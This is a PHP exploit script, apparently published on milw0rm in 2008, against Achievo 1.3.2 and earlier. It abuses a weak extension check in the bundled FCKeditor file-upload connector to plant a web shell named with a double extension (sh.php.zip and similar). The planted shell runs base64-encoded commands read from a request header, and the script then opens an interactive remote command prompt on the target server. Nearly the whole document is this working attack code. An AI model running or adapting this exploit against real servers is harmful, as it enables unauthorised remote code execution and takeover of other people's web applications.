<?php

/*
	-----------------------------------------------------------------
	Achievo <= 1.3.2 (fckeditor) Remote Arbitrary File Upload Exploit
	-----------------------------------------------------------------
	
	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://www.achievo.org/
	details..: works only with a specific server configuration (e.g. an Apache server with the mod_mime module installed)
	
	[-] vulnerable code in /atk/attributes/fck/editor/filemanager/browser/mcpuk/connectors/php/config.php
	
	121.	//File Area
	122.	$fckphp_config['ResourceAreas']['File'] =array(
	123.		
	124.		//Files(identified by extension) that may be uploaded to this area
	125.		'AllowedExtensions'	=>	array("zip","doc","xls","pdf","rtf","csv","jpg","gif","jpeg","png","avi","mpg","mpeg","swf","fla"),
	
	with a default configuration of this script, an attacker might be able to upload arbitrary
	files containing malicious PHP code due to multiple file extensions isn't properly checked
*/

error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print "\n[-] No response from {$host}:80 Trying again...";
		$sock = fsockopen($host, 80);
	}
	fputs($sock, $packet);
	while (!feof($sock)) $resp .= fread($sock, 1024);
	fclose($sock);
	return $resp;
}

function upload()
{
	global $host, $path;
	
	$connector = "atk/attributes/fck/editor/filemanager/browser/mcpuk/connectors/php/connector.php";
	$file_ext  = array("zip", "swf", "fla", "doc", "xls", "rtf", "csv");
	
	foreach ($file_ext as $ext)
	{
		print "\n[-] Trying to upload with .{$ext} extension...";
		
		$data  = "--12345\r\n";
		$data .= "Content-Disposition: form-data; name=\"NewFile\"; filename=\"sh.php.{$ext}\"\r\n";
		$data .= "Content-Type: application/octet-stream\r\n\r\n";
		$data .= "<?php \${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))}.\${print(_code_)} ?>\r\n";
		$data .= "--12345--\r\n";
		
		$packet  = "POST {$path}{$connector}?Command=FileUpload&CurrentFolder={$path} HTTP/1.0\r\n";
		$packet .= "Host: {$host}\r\n";
		$packet .= "Content-Length: ".strlen($data)."\r\n";
		$packet .= "Content-Type: multipart/form-data; boundary=12345\r\n";
		$packet .= "Connection: close\r\n\r\n";
		$packet .= $data;
		
		preg_match("/OnUploadCompleted\((.*),'(.*)'\)/i", http_send($host, $packet), $html);
		
		if (!in_array(intval($html[1]), array(0, 201))) die("\n[-] Upload failed! (Error {$html[1]}: {$html[2]})\n");
		
		$packet  = "GET {$path}sh.php.{$ext} HTTP/1.0\r\n";
		$packet .= "Host: {$host}\r\n";
		$packet .= "Connection: close\r\n\r\n";
		$html    = http_send($host, $packet);
		
		if (!eregi("print", $html) and eregi("_code_", $html)) return $ext;
		
		sleep(1);
	}
	
	return false;
}

print "\n+--------------------------------------------------------------------+";
print "\n| Achievo <= 1.3.2 (fckeditor) Arbitrary File Upload Exploit by EgiX |";
print "\n+--------------------------------------------------------------------+\n";

if ($argc < 3)
{
	print "\nUsage......: php $argv[0] host path\n";
	print "\nExample....: php $argv[0] localhost /";
	print "\nExample....: php $argv[0] localhost /achievo/\n";
	die();
}

$host = $argv[1];
$path = $argv[2];

if (!($ext = upload())) die("\n\n[-] Exploit failed...\n");
else print "\n[-] Shell uploaded...starting it!\n";

define(STDIN, fopen("php://stdin", "r"));

while(1)
{
	print "\nachievo-shell# ";
	$cmd = trim(fgets(STDIN));
	if ($cmd != "exit")
	{
		$packet = "GET {$path}sh.php.{$ext} HTTP/1.0\r\n";
		$packet.= "Host: {$host}\r\n";
		$packet.= "Cmd: ".base64_encode($cmd)."\r\n";
		$packet.= "Connection: close\r\n\r\n";
		$html   = http_send($host, $packet);
		if (!eregi("_code_", $html)) die("\n[-] Exploit failed...\n");
		$shell = explode("_code_", $html);
		print "\n{$shell[1]}";
	}
	else break;
}

?>

# milw0rm.com [2008-06-09]
